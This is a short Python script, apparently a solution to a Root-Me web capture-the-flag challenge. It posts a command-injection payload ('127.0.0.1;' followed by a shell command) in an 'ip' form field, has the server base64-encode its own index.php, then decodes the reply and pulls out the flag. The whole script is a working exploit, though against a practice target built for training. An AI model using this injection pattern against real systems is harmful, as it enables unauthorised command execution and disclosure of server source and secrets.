
import re
import base64
import requests

url = "http://challenge01.root-me.org/web-serveur/ch54/index.php"

COMMAND = "echo \"BEGIN\"; cat index.php | base64; echo \"END\""

response = requests.post(f"{url}", data={ "ip": f"127.0.0.1;{COMMAND}" }).text

raw_content = base64.b64decode(re.search(r"BEGIN\n((.|\n)+)\nEND", response).groups()[0]);

flag = re.search(r"\$flag = \"(.+)\";", raw_content.decode()).groups()[0]

print(f"Flag: {flag}")
